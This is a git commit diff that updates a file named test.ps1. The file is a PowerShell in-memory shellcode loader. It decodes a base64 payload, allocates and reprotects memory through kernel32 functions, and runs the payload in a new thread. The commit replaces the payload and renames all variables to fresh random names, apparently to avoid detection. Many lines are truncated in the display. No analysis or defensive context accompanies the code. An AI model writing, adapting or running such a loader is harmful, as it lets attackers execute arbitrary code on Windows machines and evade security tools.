faba874584398fa8564ef8d34881740e259272d9
y0r1nl <89488616+y0r1nl@users.noreply.github.com>
2025-03-12 14:48:32 +0100

    Update test.ps1

--- test.ps1
+++ test.ps1
@@ -1,36 +1,29 @@
-function sq {
-        Param ($lT, $ldd)
-        $wZx51 = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetTyp>
+function l8y {
+        Param ($qssn4, $jn)
+        $jHNol = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetTyp>
 
-        return $wZx51.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.H>
+        return $jHNol.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.H>
 }
 
-function pa8 {
+function hnA {
         Param (
-                [Parameter(Position = 0, Mandatory = $True)] [Type[]] $bINY,
-                [Parameter(Position = 1)] [Type] $sBuv = [Void]
+                [Parameter(Position = 0, Mandatory = $True)] [Type[]] $b32A6,
+                [Parameter(Position = 1)] [Type] $deD = [Void]
         )
 
-        $dx2u = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyB>
-        $dx2u.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $bINY).SetImplementationFlags('Runtime, Manage>
-        $dx2u.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $sBuv, $bINY).SetImplementationFlags('Runtime, Managed')
+        $r6 = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBui>
+        $r6.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $b32A6).SetImplementationFlags('Runtime, Managed>
+        $r6.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $deD, $b32A6).SetImplementationFlags('Runtime, Managed')
 
-        return $dx2u.CreateType()
+        return $r6.CreateType()
 }
 
-[Byte[]]$uLy = [System.Convert]::FromBase64String("/EiD5PDozAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUE0xyUgPt0pKSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPh>
-[Uint32]$rdQfL = 0
-$cU7BT = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((sq kernel32.dll VirtualAlloc), (pa8 @([IntPtr], [UInt32], [UInt32], [UInt32]) ([In>
+[Byte[]]$qVL6_ = [System.Convert]::FromBase64String("/EiD5PDozAAAAEFRQVBSSDHSZUiLUmBRSItSGEiLUiBWSA+3SkpNMclIi3JQSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwI>
+[Uint32]$ftbQ9 = 0
+$own = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((l8y kernel32.dll VirtualAlloc), (hnA @([IntPtr], [UInt32], [UInt32], [UInt32]) ([Int>
 
-[System.Runtime.InteropServices.Marshal]::Copy($uLy, 0, $cU7BT, $uLy.length)
-if (([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((sq kernel32.dll VirtualProtect), (pa8 @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeBy>
-        $xj = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((sq kernel32.dll CreateThread), (pa8 @([IntPtr], [UInt32], [IntPtr], [IntPtr],>
-        [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((sq kernel32.dll WaitForSingleObject), (pa8 @([IntPtr], [Int32]))).Invoke($xj,0xffff>
+[System.Runtime.InteropServices.Marshal]::Copy($qVL6_, 0, $own, $qVL6_.length)
+if (([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((l8y kernel32.dll VirtualProtect), (hnA @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeB>
+        $geQZa = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((l8y kernel32.dll CreateThread), (hnA @([IntPtr], [UInt32], [IntPtr], [IntP>
+        [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((l8y kernel32.dll WaitForSingleObject), (hnA @([IntPtr], [Int32]))).Invoke($geQZa,0x>
 }
-
-
-
-
-
-
-
